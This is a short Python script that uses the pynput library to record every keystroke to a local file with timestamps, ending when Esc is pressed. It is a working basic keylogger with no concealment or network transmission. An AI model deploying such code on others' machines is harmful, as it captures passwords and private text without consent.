from pynput.keyboard import Key, Listener
from datetime import datetime

log_file = "key_log.txt"


with open(log_file, "a") as file:
    file.write(f"\n\n--- Logging started at {datetime.now()} ---\n")


def on_press(key):
    try:
        with open(log_file, "a") as file:
            if hasattr(key, 'char') and key.char is not None:
                file.write(key.char)
            else:
              
                file.write(f"[{key.name.upper()}]")
    except Exception as e:
        print(f"Error logging key: {e}")


def on_release(key):
    if key == Key.esc:
        
        with open(log_file, "a") as file:
            file.write(f"\n--- Logging stopped at {datetime.now()} ---\n")
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
